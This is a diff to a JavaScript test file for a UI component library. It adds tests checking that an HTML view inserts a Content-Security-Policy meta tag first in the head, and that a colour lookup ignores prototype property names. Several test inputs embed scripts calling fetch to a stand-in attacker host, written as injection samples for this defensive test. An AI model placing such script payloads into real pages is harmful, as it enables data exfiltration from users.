@@ -26,7 +26,7 @@ export class LngLatBounds {constructor(){this.points=[];}extend(point){this.poin
 export class Marker {constructor(options){this.options=options;probe.markers.push(this);}setLngLat(point){this.point=point;return this;}addTo(map){map.options.container.append(this.options.element);return this;}remove(){this.removed=true;this.options.element.remove();}}
 `;
 const mapPlugin = {name:'map-contract-fixture',setup(builder){builder.onResolve({filter:/^maplibre-gl$/},()=>({path:'mock-map',namespace:'map-fixture'}));builder.onLoad({filter:/.*/,namespace:'map-fixture'},()=>({contents:mapFixture,loader:'js'}));}};
-const bundle = await build({ plugins:[mapPlugin], stdin: { contents: `export * from './library'; export * from './react'; export {chartColumns, chartDomain, chartTicks} from './components/chart'; export {balancedColumns} from './components/layout'; export {htmlDocument} from './components/drawing'; export {routeCoordinates,markerData} from './components/map'; export {youtubeId} from './components/media';`, sourcefile:'component-tests.ts', resolveDir:base, loader:'ts' }, write:false, bundle:true, platform:'node', format:'cjs', jsx:'automatic', packages:'external', tsconfigRaw:{compilerOptions:{jsx:'react-jsx'}}, alias:{'@whale-ui/react':path.join(base,'react/index.ts')}, logLevel:'silent' });
+const bundle = await build({ plugins:[mapPlugin], stdin: { contents: `export * from './library'; export * from './react'; export {chartColumns, chartDomain, chartTicks} from './components/chart'; export {balancedColumns} from './components/layout'; export {color} from './components/common'; export {htmlDocument} from './components/drawing'; export {routeCoordinates,markerData} from './components/map'; export {youtubeId} from './components/media';`, sourcefile:'component-tests.ts', resolveDir:base, loader:'ts' }, write:false, bundle:true, platform:'node', format:'cjs', jsx:'automatic', packages:'external', tsconfigRaw:{compilerOptions:{jsx:'react-jsx'}}, alias:{'@whale-ui/react':path.join(base,'react/index.ts')}, logLevel:'silent' });
 const loaded = {exports:{}};
 new Function('require','module','exports', bundle.outputFiles[0].text)(require,loaded,loaded.exports);
 const ui = loaded.exports;
@@ -267,4 +267,30 @@ test('words and glyphs take the text-safe step of a state colour while fills and
   assert.match(styleOf('plain'),/var\(--whale-fg-muted\)/);
   assert.match(styleOf('custom'),/rgb\(18, 52, 86\)|#123456/,'a literal colour passes through untouched');
  }finally{await app.close();}
+});
+
+test('HtmlView places CSP meta first in parseable head regardless of comments, style tags or leading scripts',()=>{
+ const cases=[
+  '<!-- <head> --><head><script>fetch("https://evil.test")</script></head><body>x</body>',
+  '<style><head></style><script>fetch("https://evil.test")</script>',
+  '<div title="<head>"></div><head><script>fetch("https://evil.test")</script></head>',
+  '<!doctype html><!-- <head> --><html data-x="<head>"><!-- <head> --><head><script>fetch("https://evil.test")</script></head><body>ok</body></html>',
+  '<script>fetch("https://evil.test")</script><head></head>',
+  '<!doctype html><html lang="en"><body><p>no explicit head</p></body></html>',
+ ];
+ for(const html of cases){
+  const doc=new JSDOM(ui.htmlDocument(html,'ch-test')).window.document;
+  const first=doc.head.firstElementChild;
+  assert.ok(first,'head must have a first child');
+  assert.equal(first.tagName,'META');
+  assert.equal(first.getAttribute('http-equiv'),'Content-Security-Policy');
+  assert.match(first.getAttribute('content')||'',/connect-src 'none'/);
+ }
+});
+
+test('color palette lookup ignores Object.prototype properties',()=>{
+ for(const name of ['constructor','toString','valueOf','__proto__']){
+  assert.equal(ui.color(name,false),name);
+  assert.equal(ui.color(name,true),name);
+ }
 });
